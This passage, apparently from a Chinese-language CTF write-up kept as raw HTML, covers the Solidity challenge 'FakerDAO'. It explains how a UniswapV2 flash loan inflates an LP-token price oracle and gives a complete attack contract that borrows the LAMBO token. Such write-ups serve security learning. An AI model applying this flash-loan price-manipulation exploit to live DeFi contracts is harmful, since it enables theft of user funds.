punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> _depositRequired <span class=\"token operator\">=</span> _amount<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>_tokenPrice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>_balance <span class=\"token operator\">>=</span> _depositRequired<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough collateral\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// we get LP tokens</span>\n        <span class=\"token function\">Pair</span><span class=\"token punctuation\">(</span>pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _depositRequired<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// you get a LAMBO</span>\n        <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">price</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">address</span> token0 <span class=\"token operator\">=</span> <span class=\"token function\">Pair</span><span class=\"token punctuation\">(</span>pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">token0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">address</span> token1 <span class=\"token operator\">=</span> <span class=\"token function\">Pair</span><span class=\"token punctuation\">(</span>pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">token1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> _reserve0 <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> _reserve1 <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>_reserve0 <span class=\"token operator\">*</span> _reserve1<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token function\">Pair</span><span class=\"token punctuation\">(</span>pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">library</span> <span class=\"token class-name\">$</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token builtin\">address</span> <span class=\"token keyword\">constant</span> UniswapV2_FACTORY <span class=\"token operator\">=</span> <span class=\"token number\">0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ropsten</span>\n\t<span class=\"token builtin\">address</span> <span class=\"token keyword\">constant</span> UniswapV2_ROUTER02 <span class=\"token operator\">=</span> <span class=\"token number\">0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ropsten</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">PoolToken</span> <span class=\"token keyword\">is</span> IERC20\n<span class=\"token punctuation\">&#123;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">Pair</span> <span class=\"token keyword\">is</span> PoolToken\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">token0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">token1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">price0CumulativeLast</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _price0CumulativeLast<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">price1CumulativeLast</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _price1CumulativeLast<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">getReserves</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint112</span> _reserve0<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint112</span> _reserve1<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint32</span> _blockTimestampLast<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">mint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _liquidity<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">sync</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Analyze-3\"><a href=\"#Analyze-3\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h3><p>首先需要了解uniswapv2协议，可以参考<a href=\"https://cloud.tencent.com/developer/article/1850625\">UniswapV2协议解析</a>以及<a href=\"https://learnblockchain.cn/article/3622\">Uniswap-v2 Pair合约分析</a></p>\n<p>想要获得Lambo必须通过instance下的borrow函数，获得流动性代币则需要addliquidity从而触发mint函数获得流动性代币</p>\n<p>mint数量计算方法如下</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token builtin\">uint</span> balance0 <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint</span> balance1 <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint</span> amount0 <span class=\"token operator\">=</span> balance0<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>_reserve0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint</span> amount1 <span class=\"token operator\">=</span> balance1<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>_reserve1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_totalSupply <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    \n            liquidity <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">sqrt</span><span class=\"token punctuation\">(</span>amount0<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>amount1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>MINIMUM_LIQUIDITY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MINIMUM_LIQUIDITY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// permanently lock the first MINIMUM_LIQUIDITY tokens</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    \n            liquidity <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">min</span><span class=\"token punctuation\">(</span>amount0<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>_totalSupply<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> _reserve0<span class=\"token punctuation\">,</span> amount1<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>_totalSupply<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> _reserve1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在此处amount0和_totalSupply都是1000000*10 **18，将会抵消，所以添加流动性的代币数量就是最终mint的流动性代币，首先在攻击合约中添加流动性mint给攻击合约100个流动性代币，此时IERC20(token0).balanceOf(pair)和IERC20(token1).balanceOf(pair)和Pair(pair).totalSupply()都是1000100 * 10 * *18，计算的价格也将是这个数值，显然不够，所以我们可以利用uniswapv2的flash loan属性，先借出token1和token2.</p>\n<p>此时reserve还没有更新，最多只能借出999,999,999,999,999,999,999,999,假设另一个代币借出数量为0，经过计算price还比余额高出1*10 **18，所以将另一个代币借出1 </p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202205210214957.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202205210214431.png\"></p>\n<p>经过计算此时的price恰好为100*10**18，即可满足borrow条件</p>\n<p>调用borrow，归还flash loan，再将lambo转移到player下</p>\n<h3 id=\"Attack-3\"><a href=\"#Attack-3\" class=\"headerlink\" title=\"Attack\"></a>Attack</h3><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">library</span> <span class=\"token class-name\">$</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">constant</span> UniswapV2_FACTORY <span class=\"token operator\">=</span> <span class=\"token number\">0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ropsten</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">constant</span> UniswapV2_ROUTER02 <span class=\"token operator\">=</span> <span class=\"token number\">0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ropsten</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> instance<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> pair<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> router<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> out0<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> out1<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _instance<span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span> _pair<span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span> _router<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        instance<span class=\"token operator\">=</span>_instance<span class=\"token punctuation\">;</span>\n        pair<span class=\"token operator\">=</span>_pair<span class=\"token punctuation\">;</span>\n        router<span class=\"token operator\">=</span>_router<span class=\"token punctuation\">;</span>\n        out0<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        out1<span class=\"token operator\">=</span><span class=\"token number\">999999999999999999999999</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">address</span> token0 <span class=\"token operator\">=</span> <span class=\"token function\">Pair</span><span class=\"token punctuation\">(</span>pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">token0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">address</span> token1 <span class=\"token operator\">=</span> <span class=\"token function\">Pair</span><span class=\"token punctuation\">(</span>pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">token1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>router<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>router<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">IUniswapV2Router</span><span class=\"token punctuation\">(</span>router<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">addLiquidity</span><span class=\"token punctuation\">(</span>token0<span class=\"token punctuation\">,</span>token1<span class=\"token punctuation\">,</span><span class=\"token number\">100</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">**</span> <span class=\"token number\">18</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">**</span> <span class=\"token number\">18</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">Pair</span><span class=\"token punctuation\">(</span>pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">swap</span><span class=\"token punctuation\">(</span>out0<span class=\"token punctuation\">,</span> out1<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">'flash loan'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">uniswapV2Call</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _amount0<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _amount1<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span> _data<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span>  <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">address</span> token0 <span class=\"token operator\">=</span> <span class=\"token function\">Pair</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">token0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">address</span> token1 <span class=\"token operator\">=</span> <span class=\"token function\">Pair</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">token1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">FakerDAO</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">borrow</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">toPlayer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">FakerDAO</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">IERC20</span><span class=\"token punctuation\">&#123;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">allowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> amount\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Approval</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> owner<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">FakerDAO</span> <span class=\"token keyword\">is</span> IERC20<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">borrow</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">Pair</span> <span class=\"token keyword\">is</span> IERC20\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">token0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">token1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">price0CumulativeLast</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _price0CumulativeLast<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">price1CumulativeLast</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _price1CumulativeLast<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getReserves</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint112</span> _reserve0<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint112</span> _reserve1<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint32</span> _blockTimestampLast<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">mint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _liquidity<span class=\"token 